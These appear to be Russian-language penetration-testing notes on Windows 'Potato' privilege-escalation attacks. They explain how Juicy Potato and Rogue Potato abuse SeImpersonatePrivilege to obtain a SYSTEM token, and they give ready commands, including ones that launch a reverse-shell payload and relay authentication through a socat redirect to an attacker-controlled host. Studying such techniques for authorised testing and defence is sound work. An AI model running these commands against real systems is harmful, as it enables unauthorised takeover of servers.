> **Potato Attacks** - Это классика LPE на локальной машине Windows.

Атака имитирует NTLM relay, только в рамках одной машины

Эта атака заставляет систему, а именно сервис с правами `SeImpersonatePrivillege` постучаться к тебе, перехватить аутентификацию и подменить ее токен на свой

## Условия 

1) Взломанный сервис (IIS, MSSQL, ...)
2) Наличие у него привилегии **`SeImpersonatePrivilege`** или **`SeAssignPrimaryTokenPrivilege`**
3) Отсутствие патчей

## Виды 

### 1) Juice Potato

> Это развитие старой _Rotten Potato_. Она стала популярной, потому что позволяла автоматизировать атаку на Windows 10 и Server 2016/2019.

- **Механизм:** Использует **DCOM** (Distributed Component Object Model). Ты просишь систему создать экземпляр объекта DCOM с определенным CLSID. Система делает это от имени `SYSTEM` и пытается подключиться к порту, который ты контролируешь.

- **Почему она "Juice":** Потому что она позволяет выбирать разные CLSID (идентификаторы объектов), если стандартные не работают.

- **Когда использовать:** Когда у тебя есть права сервисного аккаунта (например, после взлома веб-сервера) и привилегия **`SeImpersonatePrivilege`** или **`SeAssignPrimaryTokenPrivilege`**.

- **Ограничение:** Microsoft со временем закрыла возможность DCOM обращаться к портам, отличным от 135, что затруднило атаку на новых версиях Windows (сборки выше 1809).

#### Эксплуатация 
Работает на Windows 10 (до билда 1809) и Windows Server 2016.

**Подготовка:** Необходим сам бинарник `JuicePotato.exe` и подходящий **CLSID** (идентификатор COM-объекта, который работает от имени SYSTEM). Список CLSID можно найти в [репозитории проекта](https://github.com/ohpe/juicy-potato/tree/master/CLSID).

Поиск COM-объектов, (часто запущены от SYSTEM)
```cmd
reg query HKCR\CLSID /s /f LocalService
```

```cmd
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\shell.exe" -t '*' -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

- `-l 1337`: Локальный COM-порт.
- `-p`: Программа, которую нужно запустить.
- `-a`: Аргументы (например, запуск твоего реверс-шелла).
- `-t *`: Пробовать обе функции создания токена (`CreateProcessWithTokenW` и `CreateProcessAsUserW`).
- `-c {CLSID}`: Тот самый идентификатор (зависит от версии ОС).

### 2) Rogue Potato

> Когда Microsoft «подрезала крылья» Juice Potato, ограничив порты для DCOM, появилась «Разбойничья картошка».

- **Механизм:** Она обходит ограничения портов. Вместо того чтобы заставлять систему стучаться на твой локальный порт, она заставляет её стучаться на **удаленный IP** (контролируемый тобой), но по порту 135 (RPC).

- **Трюк с пайпами (Named Pipes):** Ты перенаправляешь этот трафик обратно на свой локальный сервер. В итоге система думает, что говорит с удаленным сервером по стандарту, а на самом деле она отдает свои данные аутентификации твоему локальному именованному каналу (Named Pipe).

- **Результат:** Ты снова получаешь токен `SYSTEM`.

- **Особенности:** Требует чуть больше настройки (нужен удаленный IP или хитрый проброс портов), но работает там, где Juice Potato бессильна.

#### Эксплуатация 

>Когда Microsoft запретила DCOM-объектам стучаться на произвольные порты (билд 1809+), `Juice Potato` перестала работать. `Rogue Potato` обходит это, заставляя систему стучаться на порт 135 удаленного хоста.

**Схема атаки:**

1. **На твоей машине (Kali):** Тебе нужно перенаправить трафик с порта 135 на порт твоего эксплойта на Windows. Используй `socat`.
```Bash
socat TCP-LISTEN:135,fork,reuseaddr TCP:<IP_ЖЕРТВЫ>:9999
```

2. **На машине жертвы (Windows):** Запускаешь эксплойт, указывая IP своей Kali.
```PowerShell
.\RoguePotato.exe -r <IP_KALI> -e "c:\temp\shell.exe" -l 9999
```

- `-r`: IP атакующего (куда пойдет запрос аутентификации).
- `-e`: Твой пейлоад.
- `-l`: Локальный порт, на который `socat` вернет трафик.
